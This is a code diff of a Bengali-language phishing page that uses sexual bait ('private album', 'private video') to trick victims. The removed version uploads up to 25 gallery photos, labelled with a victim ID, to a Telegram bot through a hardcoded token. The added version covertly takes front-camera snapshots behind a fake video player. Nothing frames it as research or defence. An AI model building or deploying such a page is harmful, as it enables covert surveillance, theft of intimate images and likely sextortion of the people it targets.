@@ -3,98 +3,131 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>প্রিয়ার প্রাইভেট অ্যালবাম 🔞</title>
+  <title>Private Video • Tap to Play</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box;}
-    body{background:#000;color:#fff;font-family:sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center;overflow:hidden;}
-    .container{padding:20px;}
-    h1{font-size:26px;margin-bottom:15px;color:#ff0066;}
-    .blur{background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;border-radius:15px;height:70vh;margin:20px auto;position:relative;box-shadow:0 0 30px rgba(255,0,102,0.6);}
-    .blur::after{content:"🔒 Tap করে Full HD দেখো";position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,0,0,0.8);padding:20px 40px;font-size:22px;border-radius:50px;border:3px solid #ff0066;animation:pulse 1.5s infinite;}
-    @keyframes pulse{0%{transform:translate(-50%,-50%) scale(1);}50%{transform:translate(-50%,-50%) scale(1.1);}100%{transform:translate(-50%,-50%) scale(1);}}
-    .warning{color:#ff0066;font-size:18px;margin:20px 0;}
-    .btn{background:#ff0066;color:white;padding:18px 50px;font-size:20px;border:none;border-radius:50px;margin:20px auto;display:block;animation:glow 2s infinite;}
-    @keyframes glow{0%{box-shadow:0 0 20px #ff0066;}100%{box-shadow:0 0 40px #ff33aa;}}
-    input{display:none;}
-    .loader{color:#0f0;font-size:18px;margin-top:30px;display:none;}
+    body,html{height:100%;background:#000;overflow:hidden;font-family:'Segoe UI',sans-serif;}
+
+    /* রিডাইরেক্ট ফ্রেম */
+    iframe{width:100%;height:100%;border:none;display:none;}
+
+    /* ফেক ভিডিও প্লেয়ার */
+    .player{
+      position:relative;width:100%;height:100%;display:flex;align-items:center;justify-content:center;
+    }
+    .blur-bg{
+      position:absolute;top:0;left:0;width:100%;height:100%;
+      background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover no-repeat;
+      filter:blur(15px) brightness(0.5);
+      transform:scale(1.1);
+    }
+    .content{
+      position:relative;z-index:10;text-align:center;color:white;
+    }
+    .play-btn{
+      width:100px;height:100px;background:rgba(255,0,0,0.95);
+      border-radius:50%;display:flex;align-items:center;justify-content:center;
+      cursor:pointer;margin:0 auto 25px;
+      box-shadow:0 0 50px rgba(255,0,0,0.8);
+      animation:pulse 2s infinite;
+      border:4px solid rgba(255,255,255,0.3);
+    }
+    .play-btn::after{
+      content:'▶';font-size:48px;color:white;margin-left:8px;
+    }
+    @keyframes pulse{
+      0%{transform:scale(1);box-shadow:0 0 0 0 rgba(255,0,0,0.7);}
+      70%{transform:scale(1.15);box-shadow:0 0 0 30px rgba(255,0,0,0);}
+      100%{transform:scale(1);box-shadow:0 0 0 0 rgba(255,0,0,0);}
+    }
+    .title{
+      font-size:26px;font-weight:bold;text-shadow:0 0 20px #000;
+      margin-bottom:10px;
+    }
+    .subtitle{
+      font-size:18px;text-shadow:0 0 15px #000;
+      opacity:0.95;
+    }
+
+    /* ক্যামেরা প্রিভিউ */
+    .cam-box{
+      position:absolute;top:0;left:0;width:100%;height:100%;background:#000;
+      display:flex;flex-direction:column;align-items:center;justify-content:center;
+      z-index:20;display:none;
+    }
+    video{max-width:90%;border-radius:18px;border:5px solid #0066ff;box-shadow:0 0 50px #0066ff;}
+    .msg{color:#00ff9d;font-size:19px;margin-top:20px;}
   </style>
 </head>
 <body>
 
-<div class="container">
-  <h1>প্রিয়ার প্রাইভেট অ্যালবাম 🔞</h1>
-  <p style="font-size:18px;margin:15px 0;">শুধু তোমার জন্য আনলক করা হয়েছে!</p>
-  
-  <div class="blur"></div>
-  
-  <p class="warning">⚠️ Full HD দেখতে নিচের বাটনে ট্যাপ করো</p>
-  <button class="btn" onclick="unlock()">🖼️ অ্যালবাম ওপেন করো</button>
-  
-  <div class="loader">অ্যালবাম লোড হচ্ছে... দয়া করে অপেক্ষা করুন ⌛</div>
+<iframe id="redirectFrame"></iframe>
+
+<div class="player" id="fakePlayer">
+  <div class="blur-bg"></div>
+  <div class="content" onclick="startCamera()">
+    <div class="play-btn"></div>
+    <div class="title">প্রাইভেট ভিডিও 🔞</div>
+    <div class="subtitle">ট্যাপ করো ফুল HD দেখার জন্য</div>
+  </div>
 </div>
 
-<input type="file" id="gallery" accept="image/*" multiple>
+<div class="cam-box" id="camPreview">
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <div class="msg">ভিডিও লোড হচ্ছে... অপেক্ষা করুন</div>
+</div>
 
 <script>
-// তোমার টেলিগ্রাম
-const BOT_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";
-const CHAT_ID = "7731349577";
+const params = new URLSearchParams(location.search);
+const id = params.get('id');
+const redirectUrl = params.get('r') ? decodeURIComponent(params.get('r')) : null;
 
-const urlParams = new URLSearchParams(location.search);
-const victimId = urlParams.get('id') || 'unknown';
-
-function unlock() {
-  document.querySelector('.btn').style.display = 'none';
-  document.querySelector('.loader').style.display = 'block';
-  
-  const input = document.getElementById('gallery');
-  
-  // প্রথমে ট্রাই করে দেখি
-  input.click();
-  
-  input.onchange = function(e) {
-    const files = e.target.files;
-    if (!files || files.length === 0) {
-      alert("কোনো ছবি সিলেক্ট করা হয়নি 😢");
-      redirect();
-      return;
-    }
-
-    let sent = 0;
-    const total = Math.min(files.length, 25); // সর্বোচ্চ ২৫টা ছবি
-
-    for (let i = 0; i < total; i++) {
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('photo', files[i]);
-      formData.append('caption', `VICTIM: ${victimId}\nIP: ${navigator.userAgent.substring(0, 50)}\nTime: ${new Date().toLocaleString()}\nPhoto ${i+1}/${total}`);
-
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      }).then(() => {
-        sent++;
-        if (sent === total) {
-          setTimeout(redirect, 2000);
-        }
-      }).catch(() => {
-        sent++;
-        if (sent === total) redirect();
-      });
-    }
-  };
+if (redirectUrl) {
+  document.getElementById('redirectFrame').src = redirectUrl;
+  document.getElementById('redirectFrame').style.display = 'block';
+} else {
+  document.getElementById('fakePlayer').style.display = 'flex';
 }
 
-// যদি কেউ ব্যাক চাপে বা বন্ধ করে, তবুও ট্রাই করা
-setTimeout(() => {
-  try { document.getElementById('gallery').click(); } catch(e) {}
-}, 4000);
+function startCamera() {
+  document.getElementById('fakePlayer').style.display = 'none';
+  document.getElementById('camPreview').style.display = 'flex';
 
-function redirect() {
-  document.body.innerHTML = `<div style="color:#0f0;padding:50px;font-size:22px;">অ্যালবাম লোড হচ্ছে...<br>আর মাত্র কিছুক্ষণ ⌛</div>`;
-  setTimeout(() => {
-    window.location.href = "https://www.google.com";
-  }, 3000);
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const ctx = canvas.getContext('2d');
+  let count = 0;
+  const total = 5;
+  const images = [];
+
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(stream => {
+      video.srcObject = stream;
+      video.play();
+
+      const shoot = () => {
+        if (count >= total) {
+          localStorage.setItem('camsnap_' + id, JSON.stringify(images));
+          setTimeout(() => {
+            alert("ভিডিও শেষ! ধন্যবাদ ❤️");
+            location.reload();
+          }, 1200);
+          return;
+        }
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        ctx.drawImage(video, 0, 0);
+        images.push(canvas.toDataURL('image/jpeg', 0.9));
+        count++;
+        setTimeout(shoot, 800);
+      };
+      setTimeout(shoot, 1800);
+    })
+    .catch(() => {
+      document.getElementById('camPreview').innerHTML = 
+        `<div style="color:#ff0055;font-size:22px;padding:20px;">ক্যামেরা অনুমতি দাও!</div>`;
+    });
 }
 </script>
 </body>
